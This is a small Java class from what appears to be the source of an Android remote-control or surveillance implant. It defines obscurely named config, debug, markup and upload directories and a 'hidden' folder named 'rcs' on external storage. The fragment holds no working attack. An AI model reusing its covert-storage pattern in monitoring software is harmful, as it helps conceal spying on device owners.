package com.ht.RCSAndroidGUI.file;

import android.os.Environment;

public class Path {


    public static final String CONF_DIR = "cdd/";
    public static final String DEBUG_DIR = "dwm/";
    public static final String MARKUP_DIR = "msdd/";
    public static final String UPLOAD_DIR = "";

	public static String hidden() {

		return Environment.getExternalStorageDirectory()+"/"+"rcs";

	}

}
